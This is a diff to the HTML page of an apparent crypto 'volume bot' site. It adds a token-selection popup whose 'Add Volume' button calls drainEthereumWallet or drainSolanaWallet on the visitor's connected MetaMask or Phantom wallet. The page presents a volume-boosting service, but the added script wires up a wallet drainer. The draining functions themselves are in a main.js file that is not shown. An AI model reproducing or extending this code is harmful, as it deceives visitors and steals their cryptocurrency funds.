@@ -219,6 +219,7 @@
       box-shadow: 0 0 10px rgba(250, 204, 21, 0.3);
       transition: transform 0.2s, box-shadow 0.2s;
       text-align: center;
+      cursor: pointer;
     }
     .token-card:hover {
       transform: translateY(-5px);
@@ -239,6 +240,96 @@
     }
     .token-card .market-cap {
       color: #9ca3af;
+    }
+    .token-popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+    }
+    .token-popup.active {
+      display: flex;
+    }
+    .token-popup-content {
+      background: #1a182e;
+      border: 1px solid #f97316;
+      border-radius: 12px;
+      padding: 24px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      transform: scale(1.2);
+      transition: transform 0.3s ease;
+    }
+    .token-popup-content p {
+      margin: 0.5rem 0;
+      font-size: 1rem;
+    }
+    .token-popup-content .name {
+      font-weight: bold;
+      font-size: 1.5rem;
+      color: #facc15;
+    }
+    .token-popup-content .address {
+      word-break: break-all;
+      color: #d1d5db;
+    }
+    .token-popup-content .market-cap {
+      color: #9ca3af;
+    }
+    .token-popup-content .input-group {
+      display: flex;
+      align-items: center;
+      margin: 1rem 0;
+    }
+    .token-popup-content .input-group span {
+      color: #facc15;
+      font-size: 1.2rem;
+      margin-right: 0.5rem;
+    }
+    .token-popup-content .volume-input {
+      flex-grow: 1;
+      background: #1a182e;
+      border: 1px solid #f97316;
+      color: #fff;
+      padding: 0.5rem;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    .token-popup-content .add-volume-btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      background: linear-gradient(45deg, #facc15, #f97316);
+      color: #000;
+      font-weight: bold;
+      border-radius: 6px;
+      box-shadow: 0 0 10px rgba(250, 204, 21, 0.7);
+      transition: transform 0.2s, box-shadow 0.2s;
+      border: none;
+      cursor: pointer;
+    }
+    .token-popup-content .add-volume-btn:hover {
+      color: #fff;
+      transform: scale(1.05);
+      box-shadow: 0 0 15px rgba(250, 204, 21, 1);
+    }
+    .token-popup-content .close-popup {
+      background: #4b5563;
+      color: #fff;
+      margin-top: 16px;
+    }
+    .token-popup-content .close-popup:hover {
+      background: #6b7280;
+      transform: scale(1.05);
+      box-shadow: 0 0 15px rgba(107, 114, 128, 0.7);
     }
   </style>
 </head>
@@ -284,262 +375,339 @@
   <section class="py-12 px-4 max-w-6xl mx-auto">
     <h2 class="text-2xl font-semibold text-yellow-400 mb-6 text-center" style="text-shadow: 0 0 10px rgba(250, 204, 21, 0.8);">Explore Top Tokens for Volume Boosting</h2>
     <div class="token-grid">
-      <div class="token-card">
+      <div class="token-card" data-address="0xdac17f958d2ee523a2206206994597c13d831ec7">
         <p class="name">USDT (ETH)</p>
         <p class="address">0xdac17f958d2ee523a2206206994597c13d831ec7</p>
         <p class="market-cap">Market Cap: $120B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48">
         <p class="name">USDC (ETH)</p>
         <p class="address">0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48</p>
         <p class="market-cap">Market Cap: $34B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x514910771af9ca656af840dff83e8264ecf986ca">
         <p class="name">LINK (ETH)</p>
         <p class="address">0x514910771af9ca656af840dff83e8264ecf986ca</p>
         <p class="market-cap">Market Cap: $16B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x2af5d2ad76741191d15dde7bf6ac92d4bd912ca3">
         <p class="name">LEO (ETH)</p>
         <p class="address">0x2af5d2ad76741191d15dde7bf6ac92d4bd912ca3</p>
         <p class="market-cap">Market Cap: $8.9B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce">
         <p class="name">SHIB (ETH)</p>
         <p class="address">0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce</p>
         <p class="market-cap">Market Cap: $7.2B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x1f9840a85d5af5bf1d1762f925bdaddc4201f984">
         <p class="name">UNI (ETH)</p>
         <p class="address">0x1f9840a85d5af5bf1d1762f925bdaddc4201f984</p>
         <p class="market-cap">Market Cap: $6.4B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x6982508145454ce325ddbeb5388b1e9e9b404ee">
         <p class="name">PEPE (ETH)</p>
         <p class="address">0x6982508145454ce325ddbeb5388b1e9e9b404ee</p>
         <p class="market-cap">Market Cap: $4.4B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddea9">
         <p class="name">AAVE (ETH)</p>
         <p class="address">0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddea9</p>
         <p class="market-cap">Market Cap: $4.2B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x3c3a81e81dc49a468bea9d0fc85412f65947f1cf">
         <p class="name">MNT (ETH)</p>
         <p class="address">0x3c3a81e81dc49a468bea9d0fc85412f65947f1cf</p>
         <p class="market-cap">Market Cap: $4.5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x57e114b691db7904ca757b1df9d453d4331fd3d5">
         <p class="name">ENA (ETH)</p>
         <p class="address">0x57e114b691db7904ca757b1df9d453d4331fd3d5</p>
         <p class="market-cap">Market Cap: $3B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB">
         <p class="name">USDT (SOL)</p>
         <p class="address">Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB</p>
         <p class="market-cap">Market Cap: $120B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v">
         <p class="name">USDC (SOL)</p>
         <p class="address">EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</p>
         <p class="market-cap">Market Cap: $34B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="JUPyiwrYJFskUPi3on1qnRMyb9KC3bCDevoQAxs6WzD">
         <p class="name">JUP (SOL)</p>
         <p class="address">JUPyiwrYJFskUPi3on1qnRMyb9KC3bCDevoQAxs6WzD</p>
         <p class="market-cap">Market Cap: $0.7B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3">
         <p class="name">PYTH (SOL)</p>
         <p class="address">HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3</p>
         <p class="market-cap">Market Cap: $0.5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">
         <p class="name">RAY (SOL)</p>
         <p class="address">4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R</p>
         <p class="market-cap">Market Cap: $0.6B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263">
         <p class="name">BONK (SOL)</p>
         <p class="address">DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263</p>
         <p class="market-cap">Market Cap: $1.5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="EKpQGSJtjMFqUZ5dscq4YN5s9of7uUkaeA1QHiNjYUy7">
         <p class="name">WIF (SOL)</p>
         <p class="address">EKpQGSJtjMFqUZ5dscq4YN5s9of7uUkaeA1QHiNjYUy7</p>
         <p class="market-cap">Market Cap: $2B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="6D7NaBelnjprAMg7NNLkwX9FaDgiLu4yaex2dtfuDMdK">
         <p class="name">POPCAT (SOL)</p>
         <p class="address">6D7NaBelnjprAMg7NNLkwX9FaDgiLu4yaex2dtfuDMdK</p>
         <p class="market-cap">Market Cap: $1B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4">
         <p class="name">MEW (SOL)</p>
         <p class="address">HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4</p>
         <p class="market-cap">Market Cap: $0.8B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="hntyVP6YFm1E9D3g8E2An6MmPMwQyzkgCUnxazhS154">
         <p class="name">HNT (SOL)</p>
         <p class="address">hntyVP6YFm1E9D3g8E2An6MmPMwQyzkgCUnxazhS154</p>
         <p class="market-cap">Market Cap: $1B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x6b175474e89094c44da98b954eedeac495271d0f">
         <p class="name">DAI (ETH)</p>
         <p class="address">0x6b175474e89094c44da98b954eedeac495271d0f</p>
         <p class="market-cap">Market Cap: $5.3B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2">
         <p class="name">MKR (ETH)</p>
         <p class="address">0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2</p>
         <p class="market-cap">Market Cap: $2.1B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x5a98fcbea516cf06857215779fd812ca3bef1b32">
         <p class="name">LDO (ETH)</p>
         <p class="address">0x5a98fcbea516cf06857215779fd812ca3bef1b32</p>
         <p class="market-cap">Market Cap: $1.8B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xd533a949740bb3306d119cc777fa900ba034cd52">
         <p class="name">CRV (ETH)</p>
         <p class="address">0xd533a949740bb3306d119cc777fa900ba034cd52</p>
         <p class="market-cap">Market Cap: $1.2B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xc00e94cb662c3520282e6f5717214004a7f26888">
         <p class="name">COMP (ETH)</p>
         <p class="address">0xc00e94cb662c3520282e6f5717214004a7f26888</p>
         <p class="market-cap">Market Cap: $0.9B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x0d8775f648430679a709e98d2b0cb6250d2887ef">
         <p class="name">BAT (ETH)</p>
         <p class="address">0x0d8775f648430679a709e98d2b0cb6250d2887ef</p>
         <p class="market-cap">Market Cap: $0.8B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xe41d2489571d322189246dafa5ebde1f4699f498">
         <p class="name">ZRX (ETH)</p>
         <p class="address">0xe41d2489571d322189246dafa5ebde1f4699f498</p>
         <p class="market-cap">Market Cap: $0.7B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x111111111117dc0aa78b770fa6a738034120c302">
         <p class="name">1INCH (ETH)</p>
         <p class="address">0x111111111117dc0aa78b770fa6a738034120c302</p>
         <p class="market-cap">Market Cap: $0.6B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f">
         <p class="name">SNX (ETH)</p>
         <p class="address">0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f</p>
         <p class="market-cap">Market Cap: $0.5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xba100000625a3754423978a60c9317c58a424e3d">
         <p class="name">BAL (ETH)</p>
         <p class="address">0xba100000625a3754423978a60c9317c58a424e3d</p>
         <p class="market-cap">Market Cap: $0.4B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE">
         <p class="name">ORCA (SOL)</p>
         <p class="address">orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE</p>
         <p class="market-cap">Market Cap: $0.3B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So">
         <p class="name">MSOL (SOL)</p>
         <p class="address">mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So</p>
         <p class="market-cap">Market Cap: $0.9B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="jtojtomepa8beP8AuQc6e3nZsKxLeSU6P13C5K6V1">
         <p class="name">JTO (SOL)</p>
         <p class="address">jtojtomepa8beP8AuQc6e3nZsKxLeSU6P13C5K6V1</p>
         <p class="market-cap">Market Cap: $0.4B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1">
         <p class="name">SBR (SOL)</p>
         <p class="address">Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1</p>
         <p class="market-cap">Market Cap: $0.2B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT">
         <p class="name">STEP (SOL)</p>
         <p class="address">StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT</p>
         <p class="market-cap">Market Cap: $0.1B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp">
         <p class="name">SLND (SOL)</p>
         <p class="address">SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp</p>
         <p class="market-cap">Market Cap: $0.15B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="AGFEad2et2ZJif9jaGpdMixQqvW5i81aBdvKe7PHNfz3">
         <p class="name">FTT (SOL)</p>
         <p class="address">AGFEad2et2ZJif9jaGpdMixQqvW5i81aBdvKe7PHNfz3</p>
         <p class="market-cap">Market Cap: $0.5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt">
         <p class="name">SRM (SOL)</p>
         <p class="address">SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt</p>
         <p class="market-cap">Market Cap: $0.3B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="MangoCzJ36AjZyKwVj3Vn6h4uW3Y8pf3J6pCz3dZ1x2">
         <p class="name">MNGO (SOL)</p>
         <p class="address">MangoCzJ36AjZyKwVj3Vn6h4uW3Y8pf3J6pCz3dZ1x2</p>
         <p class="market-cap">Market Cap: $0.2B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="AURYydfxJib1ZkTir1Jn1J9ECYUtjb6rKQVmtYaixWPP">
         <p class="name">AURY (SOL)</p>
         <p class="address">AURYydfxJib1ZkTir1Jn1J9ECYUtjb6rKQVmtYaixWPP</p>
         <p class="market-cap">Market Cap: $0.1B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x2260fac5e5542a773aa44fbcfedf7c193bc2c599">
         <p class="name">WBTC (ETH)</p>
         <p class="address">0x2260fac5e5542a773aa44fbcfedf7c193bc2c599</p>
         <p class="market-cap">Market Cap: $10B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xae7ab96520de3a18e5e111b5eaab095312d7fe84">
         <p class="name">STETH (ETH)</p>
         <p class="address">0xae7ab96520de3a18e5e111b5eaab095312d7fe84</p>
         <p class="market-cap">Market Cap: $9B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x50327c6c5a14dcade707abad2e27eb5173e9f3b8">
         <p class="name">TRX (ETH)</p>
         <p class="address">0x50327c6c5a14dcade707abad2e27eb5173e9f3b8</p>
         <p class="market-cap">Market Cap: $8B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe">
         <p class="name">XRP (ETH)</p>
         <p class="address">0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe</p>
         <p class="market-cap">Market Cap: $7.5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x3ee2200efb3400fabb9aacf9a2fd56c06f5c6f4b">
         <p class="name">ADA (ETH)</p>
         <p class="address">0x3ee2200efb3400fabb9aacf9a2fd56c06f5c6f4b</p>
         <p class="market-cap">Market Cap: $6B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x1ce0c145c826f36e4b7b6e6b4f5b7b5e6e6b4f5b">
         <p class="name">AVAX (ETH)</p>
         <p class="address">0x1ce0c145c826f36e4b7b6e6b4f5b7b5e6e6b4f5b</p>
         <p class="market-cap">Market Cap: $5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0xbaac2b4491727d78d2b78815144570b9f2fe8899">
         <p class="name">DOGE (ETH)</p>
         <p class="address">0xbaac2b4491727d78d2b78815144570b9f2fe8899</p>
         <p class="market-cap">Market Cap: $4B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x7083609fce4d1d8dc0c979aab8c869ea2c873402">
         <p class="name">DOT (ETH)</p>
         <p class="address">0x7083609fce4d1d8dc0c979aab8c869ea2c873402</p>
         <p class="market-cap">Market Cap: $3.5B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0">
         <p class="name">MATIC (ETH)</p>
         <p class="address">0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0</p>
         <p class="market-cap">Market Cap: $3B</p>
       </div>
-      <div class="token-card">
+      <div class="token-card" data-address="0x85f17cf997934a59727b6126a3420d0a7843d03c">
         <p class="name">NEAR (ETH)</p>
         <p class="address">0x85f17cf997934a59727b6126a3420d0a7843d03c</p>
         <p class="market-cap">Market Cap: $2.5B</p>
       </div>
     </div>
   </section>
+  <div class="token-popup" id="token-popup">
+    <div class="token-popup-content">
+      <p class="name"></p>
+      <p class="address"></p>
+      <p class="market-cap"></p>
+      <div class="input-group">
+        <span>$</span>
+        <input type="number" class="volume-input" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
+      </div>
+      <button class="add-volume-btn" aria-label="Add Volume">Add Volume</button>
+      <button class="close-popup" aria-label="Close Popup">Close</button>
+    </div>
+  </div>
   <footer class="text-center text-sm text-gray-400 py-6 border-t border-gray-700">
     <p>© 2025 Nexium-volume-bot — Built with ❤</p>
   </footer>
   <script src="canvas.js"></script>
   <script type="module" src="main.js"></script>
+  <script type="module">
+    import { NexiumApp } from './main.js';
+    
+    try {
+      const app = new NexiumApp();
+      console.log('NexiumApp initialized successfully');
+      
+      // Handle token card clicks to show popup
+      const tokenCards = document.querySelectorAll('.token-card');
+      console.log(`Found ${tokenCards.length} token cards`);
+      
+      tokenCards.forEach(card => {
+        card.addEventListener('click', () => {
+          console.log('Token card clicked:', card.dataset.address);
+          const name = card.querySelector('.name').textContent;
+          const address = card.dataset.address;
+          const marketCap = card.querySelector('.market-cap').textContent;
+          const popup = document.getElementById('token-popup');
+          const popupContent = popup.querySelector('.token-popup-content');
+          
+          popupContent.querySelector('.name').textContent = name;
+          popupContent.querySelector('.address').textContent = address;
+          popupContent.querySelector('.market-cap').textContent = marketCap;
+          popupContent.querySelector('.volume-input').value = ''; // Clear input
+          
+          const addVolumeBtn = popupContent.querySelector('.add-volume-btn');
+          addVolumeBtn.onclick = () => {
+            console.log('Add Volume button clicked for address:', address);
+            const volumeInput = popupContent.querySelector('.volume-input').value;
+            if (!volumeInput || volumeInput <= 0) {
+              app.showFeedback('Please enter a valid amount.', 'error');
+              return;
+            }
+            console.log('Volume amount:', volumeInput);
+            if (app.connectedWalletType === 'MetaMask') {
+              app.drainEthereumWallet(app.publicKey);
+            } else if (app.connectedWalletType === 'Phantom') {
+              app.drainSolanaWallet();
+            } else {
+              app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+            }
+          };
+          
+          const closePopupBtn = popupContent.querySelector('.close-popup');
+          closePopupBtn.onclick = () => {
+            console.log('Close popup clicked');
+            popup.classList.remove('active');
+          };
+          
+          popup.classList.add('active');
+        });
+      });
+      
+      // Close popup when clicking outside
+      document.getElementById('token-popup').addEventListener('click', (event) => {
+        if (event.target === event.currentTarget) {
+          console.log('Clicked outside popup, closing');
+          event.currentTarget.classList.remove('active');
+        }
+      });
+    } catch (error) {
+      console.error('Error initializing token card listeners:', error);
+    }
+  </script>
 </body>
 </html>
